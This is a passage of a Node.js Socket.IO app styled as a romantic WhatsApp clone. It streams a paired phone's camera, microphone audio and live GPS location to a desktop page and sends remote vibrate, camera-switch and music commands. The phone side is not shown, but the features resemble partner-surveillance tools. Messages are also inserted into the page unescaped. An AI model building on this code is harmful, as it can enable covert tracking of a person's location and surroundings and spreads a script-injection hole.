            const bubble = document.createElement('div');
            bubble.className = 'message-bubble';
            bubble.innerHTML = \`
                \${text}
                <div class="message-time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
            \`;
            
            if (isSpecial) {
                bubble.style.background = isSent ? '#9B59B6' : '#6C3483';
            }
            
            messageDiv.appendChild(bubble);
            
            const typingElem = document.getElementById('typingIndicator');
            if (typingElem && typingElem.parentNode === messagesArea) {
                messagesArea.removeChild(typingElem);
            }
            
            messagesArea.appendChild(messageDiv);
            messageDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesArea.appendChild(typingElem);
        }
        
        function addSystemMessage(text) {
            const msgDiv = document.createElement('div');
            msgDiv.style.cssText = 'text-align:center; font-size:11px; color:#8696A0; margin:8px 0;';
            msgDiv.textContent = text;
            messagesArea.appendChild(msgDiv);
            msgDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        function sendMessage(text) {
            if (text.trim()) {
                addMessage(text, true);
                socket.emit('romantic_message', text);
                messageInput.value = '';
                stopTyping();
                
                // Efeito de clique
                sendBtn.classList.add('pulse');
                setTimeout(() => sendBtn.classList.remove('pulse'), 300);
            }
        }
        
        let typingTimeout = null;
        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1500);
        }
        
        function stopTyping() {
            socket.emit('typing_stop');
            if (typingTimeout) {
                clearTimeout(typingTimeout);
                typingTimeout = null;
            }
        }
        
        // Socket events
        socket.on('romantic_message', (msg) => {
            addMessage(msg, false);
        });
        
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
        });
        
        socket.on('audio', (audioData) => {
            if (audioEnabled && audioContext) {
                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        
        socket.on('location', (data) => {
            locationPanel.innerHTML = \`
                📍 Localização do seu amor:<br>
                Lat: \${data.latitude.toFixed(6)} | Lng: \${data.longitude.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">
                    🗺️ Ver no mapa
                </a>
            \`;
            addSystemMessage('📍 Localização atualizada!');
        });
        
        socket.on('typing_start', () => {
            typingIndicator.classList.add('show');
            setTimeout(() => {
                typingIndicator.classList.remove('show');
            }, 2000);
        });
        
        socket.on('typing_stop', () => {
            typingIndicator.classList.remove('show');
        });
        
        socket.on('mobile_online', () => {
            contactStatus.innerHTML = 'online 💕';
            addSystemMessage('✨ Seu amor está online! ✨');
        });
        
        socket.on('connect', () => {
            addSystemMessage('✅ Conectado ao servidor');
        });
        
        socket.on('disconnect', () => {
            addSystemMessage('⚠️ Desconectado do servidor');
            contactStatus.innerHTML = 'reconectando...';
        });
        
        // Botões de controle
        document.getElementById('sendBtn').onclick = () => {
            sendMessage(messageInput.value);
        };
        
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                sendMessage(messageInput.value);
            } else {
                startTyping();
            }
        };
        
        messageInput.oninput = () => startTyping();
        
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('comando', 'vibrate');
            addSystemMessage('📳 Vibração enviada!');
            document.getElementById('vibrateBtn').classList.add('pulse');
            setTimeout(() => document.getElementById('vibrateBtn').classList.remove('pulse'), 300);
        };
        
        document.getElementById('surpriseBtn').onclick = () => {
            socket.emit('comando', 'emergency');
            addSystemMessage('🎁 Surpresa especial enviada! 💖');
            document.getElementById('surpriseBtn').classList.add('pulse');
            setTimeout(() => document.getElementById('surpriseBtn').classList.remove('pulse'), 300);
        };
        
        document.getElementById('toggleCameraBtn').onclick = () => {
            socket.emit('comando', 'trocarCamera');
            addSystemMessage('🔄 Solicitando troca de câmera');
        };
        
        // Músicas
        document.querySelectorAll('.music-item').forEach(item => {
            item.onclick = () => {
                const videoId = item.getAttribute('data-video-id');
                const songName = item.getAttribute('data-name');
                socket.emit('play_youtube', { videoId, songName });
                addSystemMessage(\`🎵 Enviando "\${songName}" para o celular\`);
            };
        });
        
        document.getElementById('stopMusicBtn').onclick = () => {
            socket.emit('stop_music');
            addSystemMessage('⏹️ Música parada no celular');
        };
        
        // Áudio do celular
        setupAudio();
        
        document.getElementById('enableAudioBtn').onclick = () => {
            audioEnabled = !audioEnabled;
            document.getElementById('enableAudioBtn').innerHTML = audioEnabled ? '🔊' : '🔇';
            addSystemMessage(audioEnabled ? '🔊 Áudio do celular ativado' : '🔇 Áudio do celular desativado');
        };
        
        document.getElementById('volumeUpBtn').onclick = () => {
            if (audioGain) {
                const newVolume = Math.min(1, audioGain.gain.value + 0.1);
                audioGain.gain.value = newVolume;
                addSystemMessage(\`📢 Volume: \${Math.round(newVolume * 100)}%\`);
            }
        };
        
        // Mensagem de boas-vindas
        setTimeout(() => {
            addSystemMessage('💕 Bem-vindo ao WhatsApp do Amor!');
            addSystemMessage('🎵 Escolha uma música para tocar em segundo plano no celular');
            addSystemMessage('💬 Digite mensagens ou use as frases rápidas');
        }, 500);
    </script>
</body>
</html>`);
  }
});

// Socket.IO lógica principal
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  // Mensagens
  socket.on('romantic_message', (msg) => {
    console.log('Mensagem:', msg);
    socket.broadcast.emit('romantic_message', msg);
  });
  
  // Músicas
  socket.on('play_youtube', (data) => {
    console.log('Play YouTube:', data.songName);
    socket.broadcast.emit('play_youtube', data);
  });
  
  socket.on('stop_music', () => {
    console.log('Stop music');
    socket.broadcast.emit('stop_music');
  });
  
  // Digitação
  socket.on('typing_start', () => {
    socket.broadcast.emit('typing_start');
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('typing_stop');
  });
  
  // Mídia
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('audio', (audioData) => {
    socket.broadcast.emit('audio', audioData);
  });
  
  // Comandos
  socket.on('comando', (cmd) => {
    console.log('Comando:', cmd);
    socket.broadcast.emit('comando', cmd);
  });
  
  // Localização
  socket.on('location', (loc) => {
    socket.broadcast.emit('location', loc);
  });
  
  // Status
  socket.on('mobile_online', () => {
    socket.broadcast.emit('mobile_online');
  });
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n💕 WhatsApp do Amor - Servidor Rodando! 💕`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   Acesse no PC: http://localhost:${PORT}`);
  console.log(`   Acesse no Celular: http://[SEU-IP]:${PORT}`);
  console.log(`\n📱 Funcionalidades:`);
  console.log(`   💬 Chat estilo WhatsApp`);
  console.log(`   📹 Vídeo ao vivo da câmera`);
  console.log(`   🎤 Áudio do celular`);
  console.log(`   📍 Localização em tempo real`);
  console.log(`   🎵 Músicas em segundo plano`);
  console.log(`   📳 Vibração e surpresas`);
  console.log(`   💝 Frases românticas prontas`);
  console.log(`\n✨ Compartilhe o amor com seu WhatsApp especial!\n`);
});
